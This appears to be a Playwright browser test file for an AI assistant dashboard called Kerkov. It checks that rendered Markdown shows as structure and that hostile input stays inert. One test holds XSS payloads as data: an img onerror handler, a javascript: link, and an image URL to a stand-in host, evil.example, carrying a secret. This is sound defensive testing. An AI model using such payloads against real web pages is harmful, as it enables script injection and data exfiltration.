"""Server-rendered Markdown shows as structure, and nothing else reaches innerHTML."""

import pytest

pytest.importorskip("playwright.sync_api")
from playwright.sync_api import Page, expect

from kerkov.web.runtime.markdown_html import render_markdown

from .agent_panel_browser_test import browser as shared_browser
from .agent_panel_browser_test import dashboard as shared_dashboard
from .agent_panel_browser_test import emit
from .stop_controls_browser_test import submit
from .streaming_browser_test import delta, start

browser = shared_browser
dashboard = shared_dashboard

ANSWER = (
    "## Findings\n\n- **SSH** open on `22`\n\n"
    "```\nnmap -sV 10.0.0.1\n```\n\n"
    "| port | service |\n|---|---|\n| 22 | ssh |\n\n"
    "[advisory](https://example.com/advisory)"
)


def rendered(text, **fields):
    return {"message": text, "html": render_markdown(text), "final": True, **fields}


def test_streamed_raw_text_becomes_one_rendered_message(dashboard: Page):
    page = dashboard
    start(page)
    delta(page, ANSWER)
    card = page.locator(".message.assistant")
    expect(card.locator("p.message-body")).to_contain_text("## Findings")
    emit(page, "assistant.stream.end", {"stream_id": "response"})
    emit(page, "assistant.message", rendered(ANSWER, stream_id="response"))
    expect(card).to_have_count(1)
    expect(card.locator(".message-label")).to_have_text("Kerkov")
    expect(card.locator("p.message-body")).to_have_count(0)
    body = card.locator(".message-body.markdown")
    expect(body.locator("h2")).to_have_text("Findings")
    expect(body.locator("strong")).to_have_text("SSH")
    expect(body.locator("pre code")).to_have_text("nmap -sV 10.0.0.1\n")
    expect(body.locator("td")).to_have_text(["22", "ssh"])
    link = body.get_by_role("link", name="advisory")
    expect(link).to_have_attribute("target", "_blank")
    expect(link).to_have_attribute("rel", "noopener noreferrer")


def test_rendered_hostile_text_stays_inert(dashboard: Page):
    page = dashboard
    text = (
        '<img src=x onerror="window.injected=true">\n\n'
        "[click](javascript:window.injected=true)\n\n"
        "![pixel](https://evil.example/pixel?secret=1)"
    )
    emit(page, "assistant.message", rendered(text))
    body = page.locator(".message.assistant .markdown")
    expect(body).to_contain_text('<img src=x onerror="window.injected=true">')
    expect(body).to_contain_text("[click](javascript:window.injected=true)")
    assert page.locator(".message img, .message script").count() == 0
    expect(body.locator("a")).to_have_attribute(
        "href", "https://evil.example/pixel?secret=1"
    )
    assert page.evaluate("window.injected") is None


def test_payloads_without_html_and_user_text_stay_plain(dashboard: Page):
    page = dashboard
    emit(page, "session.cleared", {})
    emit(page, "assistant.message", {"message": "**literal** <b>text</b>"})
    submit(page, "**my** <b>request</b>")
    expect(page.locator(".message.assistant").last).to_contain_text(
        "**literal** <b>text</b>"
    )
    expect(page.locator(".message.user")).to_contain_text("**my** <b>request</b>")
    expect(page.locator("#message-stream .markdown")).to_have_count(0)
    expect(page.locator("#message-stream b")).to_have_count(0)
    expect(page.locator(".message.assistant").first).to_have_text(
        "KerkovConversation history cleared."
    )
